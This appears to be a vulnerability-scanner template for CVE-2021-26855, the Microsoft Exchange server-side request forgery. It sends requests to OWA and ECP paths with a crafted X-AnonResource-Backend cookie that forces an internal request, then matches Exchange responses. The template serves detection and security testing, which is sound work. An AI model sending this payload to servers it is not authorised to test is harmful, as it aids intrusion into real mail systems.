id: CVE-2021-26855
info:
  name: Microsoft Exchange Server SSRF
  author: pdteam
  severity: critical
  description: Microsoft Exchange Server is vulnerable to a server-side request forgery (SSRF) vulnerability that allows attackers to send arbitrary HTTP requests and authenticate as the Exchange server.
  reference:
    - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-26855
  cve: CVE-2021-26855
  tags:
    - cve
    - ssrf
    - exchange
    - critical

http:
  - method: GET
    path:
      - "{{BaseURL}}/owa/auth/x.js"
      - "{{BaseURL}}/ecp/default.aspx"
      - "{{BaseURL}}/ecp/DDI/DDIService.svc/GetObject"

    headers:
      Cookie: "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory"

    matchers:
      - type: status
        status:
          - 200
          - 500

      - type: word
        words:
          - "Microsoft.Exchange"
          - "Exchange Server"
